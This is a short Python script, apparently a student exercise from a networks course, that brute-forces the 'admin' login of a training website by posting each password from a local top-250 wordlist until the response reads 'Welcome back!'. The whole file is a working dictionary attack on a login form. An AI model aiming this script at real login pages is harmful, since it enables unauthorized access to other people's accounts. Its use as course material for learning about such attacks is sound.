import requests


def check_password(password):
    url = "http://webisfun.cyber.org.il/login"
    username = "admin"
    data = {'username': username, 'password': password}
    r = requests.post(url, data=data)
    return r.text == "Welcome back!"


def crack_passwords(passwords):
    for password in passwords:
        if check_password(password):
            print(f"Password cracked: {password}")
            break


def main():
    with open("C:\\Users\\Cyber_User\\Documents\\Magshimim\\Netwoks Semester 2\\Week1\\top250.txt", 'r') as f:
        passwords = f.read().split('|')
    crack_passwords(passwords)


if __name__ == "__main__":
    main()
